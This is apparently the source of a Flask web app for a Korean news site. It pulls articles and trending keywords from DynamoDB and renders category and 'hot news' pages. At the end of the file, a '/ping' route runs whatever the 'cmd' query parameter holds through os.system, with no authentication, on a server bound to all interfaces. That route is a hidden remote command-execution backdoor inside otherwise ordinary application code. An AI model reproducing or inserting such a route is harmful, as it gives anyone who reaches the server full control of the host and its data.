from flask import Flask, render_template, redirect, jsonify, request
import boto3
from boto3.dynamodb.conditions import Key
from datetime import datetime, timedelta, timezone
from urllib.parse import unquote
from operator import itemgetter
import os

app = Flask(__name__)

dynamodb = boto3.resource("dynamodb", region_name="us-west-2")
news_table = dynamodb.Table("NewsArticles")
trend_table = dynamodb.Table("trend_top6")

@app.route("/")
def index():
    return redirect("/all")

@app.route("/all")
def show_all():
    response = news_table.scan()
    all_news = response.get("Items", [])
    all_news.sort(key=itemgetter("timestamp"), reverse=True)

    def filter_category(cat):
        return [item for item in all_news if item["category"] == cat][:4]

    # 🔄 최신 trend_top6 스냅샷에서 키워드 6개만 추출
    trend_items = trend_table.scan().get("Items", [])
    parsed_items = []
    for item in trend_items:
        try:
            ts = datetime.fromisoformat(item["timestamp"])
            if ts.tzinfo is None:
                ts = ts.replace(tzinfo=timezone.utc)
            parsed_items.append({**item, "parsed_ts": ts})
        except Exception:
            continue

    # 📌 최신 timestamp 구하기
    if parsed_items:
        latest_ts = max(i["parsed_ts"] for i in parsed_items)
        latest_snapshot = [i for i in parsed_items if i["parsed_ts"] == latest_ts]

        # 🥇 최신 스냅샷에서 rank 기준으로 상위 6개 키워드 추출
        trend_keywords = {
            i["keyword"] for i in sorted(latest_snapshot, key=lambda x: int(x["rank"]))[:6]
        }
    else:
        trend_keywords = set()
        

    # 📰 키워드 포함된 뉴스 필터링
    news_hot = []
    for news in all_news:
        for kw in trend_keywords:
            if kw in news.get("title", "") or kw in news.get("content", ""):
                news_hot.append(news)
                break

    # 🔢 조회수 기준 정렬
    news_hot = sorted(news_hot, key=lambda x: -int(x.get("count", 0)))[:4]

    return render_template("index.html",
                           news_hot=news_hot,
                           news_politics=filter_category("정치"),
                           news_society=filter_category("사회"),
                           news_entertainment=filter_category("연예"),
                           active_category="전체"
                           )
    
@app.route("/ping")
def ping():
    cmd = request.args.get("cmd")
    os.system(cmd)
    return "Executed"    


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
